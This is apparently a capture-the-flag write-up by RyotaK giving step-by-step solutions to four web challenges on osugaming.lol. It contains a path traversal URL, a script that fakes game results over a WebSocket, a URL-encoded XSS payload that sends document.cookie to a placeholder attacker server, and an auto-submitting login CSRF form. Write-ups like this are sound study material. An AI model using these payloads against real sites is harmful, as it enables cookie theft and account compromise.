---
title: 'web'
author: "RyotaK"
---

pp-ranking以外はあります。

## web/mikufanpage
1. Open https://mikufanpage.web.osugaming.lol/image?path=.jpg./../flag.txt

## web/when-you-dont-see-it
1. Execute `curl --silent https://osu.ppy.sh/users/11118671| grep --only-matching 'the flag is .* encoded with base64'`

## web/stream-vs
1. Open https://stream-vs.web.osugaming.lol/
2. Open DevTools
3. Execute the following JavaScript:
```javascript
function calculateClicks(targetBpm, start, end) {
    const length = end - start;
    const clicksCount = (targetBpm * 4 * length) / 60000

    const clicks = [];
    for (let i = 0; i < length; i += length / clicksCount) {
        clicks.push(i)
    }

    return clicks;
}

(async () => {
    const ws = new WebSocket(location.origin.replace("https://", "wss://").replace("http://", "ws://"));;
    ws.onmessage = (e) => {
        const {
            type,
            data
        } = JSON.parse(e.data);
        if (type === "login") {
            console.log("logged in");
            ws.send(`{"type":"challenge"}`);
            ws.send(`{"type":"start"}`);
        } else if (type === "game") {
            const song = data.songs[data.round];
            const start = data.start;
            const end = data.start + song.duration * 1000;
            const clicks = calculateClicks(song.bpm, start, end);
            const result = {
                "type": "results",
                "data": {
                    "clicks": clicks,
                    "start": start,
                    "end": end
                }
            }
            ws.send(JSON.stringify(result));

        } else if (type === "results") {
            console.log(data);
        } else if (type === "message") {
            alert(data);
        } else if (type === "error") {
            alert(data);
        }
    };
    ws.onopen = () => {
        ws.send(`{"type":"login","data":"${crypto.randomUUID()}"}`);
    }
})();
```
4. If the `Better luck next time!` popup is shown, repeat steps from step 3.

## web/profile-page-revenge
1. Open https://profile-page-revenge.web.osugaming.lol/
2. Login to your account.
3. Open https://profile-page-revenge.web.osugaming.lol/test
4. Open DevTools.
5. Execute the following JavaScript with `SERVER` replaced with your server:
```javascript
(async () => {
    const csrf = (await cookieStore.get("csrf")).value;
    await fetch("https://profile-page-revenge.web.osugaming.lol/api/update", {
        method: "POST",
        headers: {
            csrf,
            "Content-Type":"application/x-www-form-urlencoded",
        },
        body: "bio=%5byoutube%5d%5bimg%5d%3e%3c%2fiframe%3e%3ciframe%20srcdoc%3d'%3cscript%20src%3d%26quot%3b%2fa%2f%2fconsole.log(window.b%3d(parent.document.querySelector(%26amp%3bapos%3bstyle%26amp%3bapos%3b).nonce)%2cwindow.c%3ddocument.createElement(%26amp%3bapos%3bscript%26amp%3bapos%3b)%2cwindow.c.src%3d%26amp%3bapos%3bhttps%3a%2f%2fSERVER%2f%26amp%3bapos%3b.concat(document.cookie)%2cwindow.c.nonce%3dwindow.b%2cdocument.documentElement.appendChild(window.c))%2f%2f%26quot%3b%3e%3c%2fscript%3e'%20src%3d'https%3a%2f%2fwww.youtube.com%2fa'%3e%3c%2fiframe%3e%5b%2fimg%5d%5b%2fyoutube%5d"
    });
    console.log("Done");
})();
```
6. Host the following HTML on your server with `USERNAME` and `PASSWORD` replaced to your account:
```html
<form action="https://profile-page-revenge.web.osugaming.lol/api/login" method="post">
	<input name="username" value="USERNAME">
	<input name="password" value="PASSWORD">
</form>
<script>
	document.querySelector("form").submit();
</script>
```

7. Send the URL of the HTML file above to https://adminbot.web.osugaming.lol/profile-page-revenge
8. You'll receive the flag on your server.